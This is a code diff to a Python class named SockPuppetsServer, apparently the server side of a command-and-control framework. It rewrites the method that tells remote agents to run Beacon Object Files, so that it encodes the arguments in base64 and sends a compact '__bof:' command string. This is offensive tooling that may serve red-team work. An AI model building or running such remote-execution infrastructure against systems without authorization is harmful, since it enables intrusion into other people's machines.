@@ -1234,51 +1234,11 @@ class SockPuppetsServer:
             return "Command timeout - no response from agent"
 
     async def send_bof_to_agent(self, agent_id: str, bof_data: str, bof_args: str, entry: str = 'go') -> str:
-        """Send BOF execution command to agent."""
-        if agent_id not in self.agents:
-            return "Agent not found"
-
-        agent = self.agents[agent_id]
-
-        msg = {
-            'type': '__bof__',
-            'bof_data': bof_data,
-            'bof_args': bof_args,
-            'bof_entry': entry,
-        }
-
-        agent.command_history.append({
-            'command': f'__bof__ (entry={entry})',
-            'queued_at': datetime.now().isoformat()
-        })
-
-        await agent.command_queue.put(msg)
-
-        self.events.emit({
-            "event": "bof_executed",
-            "agent_id": agent_id,
-            "entry": entry,
-            "operator": "cli",
-        })
-
-        if agent.mode == 'beacon':
-            return f"[*] BOF queued for beacon (will execute on next checkin in ~{agent.beacon_interval}s)"
-
-        if agent.is_http():
-            try:
-                response = await asyncio.wait_for(agent.response_queue.get(), timeout=60.0)
-                return response
-            except asyncio.TimeoutError:
-                return "BOF execution timeout - no response from agent (HTTP)"
-
-        if agent.websocket not in self.active_connections:
-            return "Agent is not connected"
-
-        try:
-            response = await asyncio.wait_for(agent.response_queue.get(), timeout=60.0)
-            return response
-        except asyncio.TimeoutError:
-            return "BOF execution timeout - no response from agent"
+        """Send BOF execution command to agent via __bof: command format."""
+        import base64
+        args_b64 = base64.b64encode(bof_args.encode()).decode() if bof_args else ''
+        command = f"__bof:{entry}:{args_b64}:{bof_data}"
+        return await self.send_command_to_agent(agent_id, command)
 
     def get_agent_list(self) -> list:
         """Get list of all agents"""
